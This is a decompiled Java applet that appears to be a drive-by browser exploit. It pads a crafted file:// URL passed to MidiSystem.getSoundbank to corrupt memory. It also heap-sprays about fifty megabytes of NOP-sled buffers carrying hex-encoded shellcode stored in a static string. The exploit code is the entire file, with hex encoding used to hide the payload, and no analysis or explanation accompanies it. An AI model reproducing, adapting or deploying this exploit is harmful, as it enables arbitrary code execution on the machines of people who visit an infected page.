import javax.sound.midi.MidiSystem;
import java.net.URL;
import java.nio.IntBuffer;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class vmain extends Applet
{
    private IntBuffer[] mem;
    static String scc;
    
    public void init() {
        String s = HS("66696C653A2F2F");
        for (int i = 0; i < 302; ++i) {
            s += "/";
        }
        final String string = s + HS("5A255A255A255A255A255A25");
        try {
            this.mspray(HexDecode(vmain.scc), HexDecode("90909090"));
            MidiSystem.getSoundbank(new URL(string));
            while (true) {
                Thread.sleep(10L);
            }
        }
        catch (Exception ex) {}
    }
    
    public static byte[] HB(final String s) {
        final byte[] array = new byte[s.length() / 2];
        for (int i = 0; i < s.length(); i += 2) {
            array[i / 2] = (byte)((Character.digit(s.charAt(i), 16) << 4) + Character.digit(s.charAt(i + 1), 16));
        }
        return array;
    }
    
    public static String HS(final String s) {
        String string = new String();
        for (int i = 0; i < s.length(); i += 2) {
            string += (char)((Character.digit(s.charAt(i), 16) << 4) + Character.digit(s.charAt(i + 1), 16));
        }
        return string;
    }
    
    public static short[] HexDecode(final String s) {
        final short[] array = new short[s.length() / 2];
        for (int i = 0; i < s.length(); i += 2) {
            array[i / 2] = (short)(((Character.digit(s.charAt(i), 16) & 0xFF) << 4) + (Character.digit(s.charAt(i + 1), 16) & 0xFF));
        }
        return array;
    }
    
    public final IntBuffer[] mspray(final short[] array, final short[] array2) {
        final int n = 50;
        final int n2 = 1048576;
        final int n3 = n2 / 4 - array.length;
        final IntBuffer[] array3 = new IntBuffer[n];
        for (int i = 0; i < n; ++i) {
            final IntBuffer allocate = IntBuffer.allocate(n2 / 4);
            for (int j = 0; j < n3; ++j) {
                allocate.put(array2[0] | array2[1] << 8 | array2[2] << 16 | array2[3] << 24);
            }
            int k = 0;
            while (k < array.length) {
                allocate.put(array[k++] | array[k++] << 8 | array[k++] << 16 | array[k++] << 24);
            }
            array3[i] = allocate;
        }
        return array3;
    }
    
    static {
        vmain.scc = "ba94385ae9d9edd97424f429c95eb13983eefc31561003561076cda601ff2e57d29fa7b2e38ddcb75601969a5aeafa0ee89ed2215914050f5a9989c398b8751ecd1a47d1005b800cea09595a59bdee1e62bc2015dac645eaaf7c473b1f0b0fa32b53b0d2f8808c9d7572661c5c4b872ea007b69e2d56fe19ce2df4597335cf20afb0d28324623735e8f4bc3945739a5d5850905ad15777eba17353b7721ac21dd42314f989815ee8deb33c6720363bce224844614b79cfee0c861a4be2cd07fa6b8bddbef12c08fc0faeb97df4aecb78b06927f1a91f47a6ca0a2a3b5dc0d49bf55c63ac3fb3a43f32b994d6df459b064ed02f78ed75b4a982fb41d864df5889";
    }
}
